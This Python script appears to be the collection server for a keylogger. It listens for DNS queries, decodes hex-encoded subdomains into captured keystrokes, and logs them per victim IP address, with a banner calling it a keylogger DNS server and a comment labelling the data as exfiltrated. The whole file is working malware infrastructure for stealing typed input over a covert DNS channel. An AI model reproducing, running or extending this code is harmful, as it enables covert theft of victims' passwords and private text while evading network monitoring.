###############################################################
# Imports
###############################################################
import socket
from dnslib import DNSRecord, QTYPE, RR, A
import time
import os

###############################################################
# Vars. Global
###############################################################
_DNS_ADDR = ('0.0.0.0', 9953)
_FAKE_DOMAIN = '.example.com.'
_LAST_REQUEST = []
_COR = {
        'limpa':'\033[m',
        'red':'\033[31m',
        'green':'\033[32m',
        'yellow':'\033[33m'
    }
###############################################################
# Classes e Funções
###############################################################
def treatments(data):
    replacements = {
        '´a': 'á',
        '´e': 'é',
        '´i': 'í',
        '´o': 'ó',
        '´u': 'ú',
        '`a': 'à',
        '`e': 'è',
        '`i': 'ì',
        '`o': 'ò',
        '`u': 'ù',
        '^a': 'â',
        '^e': 'ê',
        '^i': 'î',
        '^o': 'ô',
        '^u': 'û',
        '~a': 'ã',
        '~o': 'õ',
    }

    for key, value in replacements.items():
        data = data.replace(key, value)
        #print(data)

    return data

def write_on_file(path, data):
    #data = treatments(data)
    #print (data)
    with open(path, 'a') as file:
        file.write(data)
        file.close()

def menu(addr=None, data=None):
    global _LAST_REQUEST

    if len(_LAST_REQUEST) <= 10 and data != None:
        _LAST_REQUEST.append(f'{addr} | {data}\n')
    elif len(_LAST_REQUEST) >= 10:
        _LAST_REQUEST.pop(0)
        _LAST_REQUEST.append(f'{addr} | {data}\n')

    request_string = ''.join(i for i in _LAST_REQUEST)

    os.system('cls')
    print(f'''
{_COR['red']}╦╔═{_COR['limpa']}┌─┐┬ ┬{_COR['red']}╦  {_COR['limpa']}┌─┐┌─┐┌─┐┌─┐┬─┐          
{_COR['red']}╠╩╗{_COR['limpa']}├┤ └┬┘{_COR['red']}║  {_COR['limpa']}│ ││ ┬│ ┬├┤ ├┬┘          
{_COR['red']}╩ ╩{_COR['limpa']}└─┘ ┴ {_COR['red']}╩═╝{_COR['limpa']}└─┘└─┘└─┘└─┘┴└─          
┬ ┬┬┌┬┐┬ ┬  {_COR['red']}╔╦╗╔╗╔╔═╗{_COR['limpa']}┌─┐┬─┐┬  ┬┌─┐┬─┐
││││ │ ├─┤   {_COR['red']}║║║║║╚═╗{_COR['limpa']}├┤ ├┬┘└┐┌┘├┤ ├┬┘
└┴┘┴ ┴ ┴ ┴  {_COR['red']}═╩╝╝╚╝╚═╝{_COR['limpa']}└─┘┴└─ └┘ └─┘┴└─    
[Aceitando requisições na porta {_COR['green']}9953{_COR['limpa']}]

[Requisições em tempo real]
{request_string}
''')


def start_dns_server():
    # Cria um socket para ouvir requisições DNS
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(_DNS_ADDR)
    
    menu()
    
    while True:
        try:
            data, addr = sock.recvfrom(512)

            # Formando o path para cada cliente
            path = str(addr[0]) + '.txt'
            
            # Lê a requisição DNS
            request = DNSRecord.parse(data)
            data = str(request.q.qname)
            data = data.replace(_FAKE_DOMAIN, '')
            
            # Decodifica os dados do domínio
            data = ''.join([chr(int(data[i:i+2], 16)) for i in range(0, len(data), 2)])
            #print(f"Dados exfiltrados: {str(data)}")
            data = treatments(data)
            menu(addr, data)
            write_on_file(path, data)            
            
            # Criando um objeto DNSRecord para a resposta
            dns_response = DNSRecord()
            # Adicionando uma resposta DNS
            dns_response.add_answer(RR(_FAKE_DOMAIN[1:], QTYPE.A, rdata=A('127.0.0.1')))
            # Convertendo a resposta para uma representação de bytes
            response_bytes = dns_response.pack()
            #print(response_bytes.hex())  # Exibindo a resposta em hexadecimal

            #time.sleep(8)
            # Envia a resposta DNS de volta para o cliente
            sock.sendto(response_bytes, addr)

        except Exception as e:
            print(e)


###############################################################
# Main
###############################################################
if __name__ == "__main__":
    start_dns_server()
